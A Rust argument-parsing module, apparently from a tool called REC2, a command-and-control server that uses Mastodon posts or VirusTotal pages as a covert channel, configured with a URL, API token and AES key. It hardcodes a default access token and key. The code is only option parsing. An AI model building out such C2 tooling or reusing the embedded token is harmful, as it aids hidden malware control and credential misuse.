//! Parsing arguments
use clap::{Arg, ArgAction, value_parser, Command};

#[derive(Debug)]
pub enum Social {
    Mastodon,
    VirusTotal,
    Unknown,
}

#[derive(Debug)]
pub struct Options {
    pub social: Social,
    pub url: String,
    pub token: String,
    pub key: String,
    pub verbose: log::LevelFilter,
}

fn cli() -> Command {
        Command::new("server")
            .about("REC2 (Rusty External Comand and Control Server)")
            .subcommand_required(true)
            .arg_required_else_help(true)
            .allow_external_subcommands(true)
            .subcommand(
                Command::new("Mastodon")
                    .about("Using Mastodon social network as external C2")
                    .arg(Arg::new("url")
                        .short('u')
                        .long("url")
                        .help("Mastodon url like https://mastodon.be/@username_fzihfzuhfuoz/109909415422853704")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("token")
                        .short('t')
                        .long("token")
                        .help("API token for your Mastodon account")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("key")
                        .short('k')
                        .long("key")
                        .help("AES master key to decode and encode communication")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("v")
                        .short('v')
                        .help("Set the level of verbosity")
                        .action(ArgAction::Count),
                    )
            )
            .subcommand(
                Command::new("VirusTotal")
                    .about("Using VirusToal website as external C2")
                    .arg(Arg::new("url")
                        .short('u')
                        .long("url")
                        .help("Virustotal url like https://www.virustotal.com/gui/file/99ff0b679081cdca00eb27c5be5fd9428f1a7cf781cc438b937cf8baf8551c4d")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("token")
                        .short('t')
                        .long("token")
                        .help("API token for your Virustotal account")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("key")
                        .short('k')
                        .long("key")
                        .help("AES master key to decode and encode communication")
                        .required(true)
                        .value_parser(value_parser!(String))
                    )
                    .arg(Arg::new("v")
                        .short('v')
                        .help("Set the level of verbosity")
                        .action(ArgAction::Count),
                    )
            )
}
    
/// Function to extract arguments
pub fn extract_args() -> Options {

        let matches = cli().get_matches();
        // DEFAULT SOCIAL NETWORK USE FOR C2
        let mut social = Social::Unknown;
        // DEFAULT SOCIAL NETWORK URL
        let mut url = "https://mastodon.be/username_fzihfzuhfuoz/109743339821428173".to_owned();
        // DEFAULT ACCESS TOKEN 
        // <https://mastodon.be/settings/applications>
        let mut token = "WkIKjtCbQzcqQd04ZsE4sFefvpjryhU5w9iVFxGz1oU".to_owned();
        // DEFAULT AES KEY
        let mut key = "d09ccee4-pass-word-0000-98677e2356fd".to_owned();
        // DEFUALT LOG LEVEL
        let mut v =  log::LevelFilter::Info;
    
        match matches.subcommand() {
            Some(("Mastodon", sub_matches)) => {
                social = Social::Mastodon;
                url = sub_matches.get_one::<String>("url").map(|s| s.to_owned()).unwrap();
                token = sub_matches.get_one::<String>("token").map(|s| s.to_owned()).unwrap();
                key = sub_matches.get_one::<String>("key").map(|s| s.to_owned()).unwrap();
                v = match sub_matches.get_count("v") {
                    0 => log::LevelFilter::Info,
                    1 => log::LevelFilter::Debug,
                    _ => log::LevelFilter::Trace,
                };
            }
            Some(("VirusTotal", sub_matches)) => {
                social = Social::VirusTotal;
                url = sub_matches.get_one::<String>("url").map(|s| s.to_owned()).unwrap();
                token = sub_matches.get_one::<String>("token").map(|s| s.to_owned()).unwrap();
                key = sub_matches.get_one::<String>("key").map(|s| s.to_owned()).unwrap();
                v = match sub_matches.get_count("v") {
                    0 => log::LevelFilter::Info,
                    1 => log::LevelFilter::Debug,
                    _ => log::LevelFilter::Trace,
                };
            }
            _ => {},
        }
    
        Options {
            social: social,
            url: url.to_string(),
            token: token.to_string(),
            key: key.to_string(),
            verbose: v,
        }
}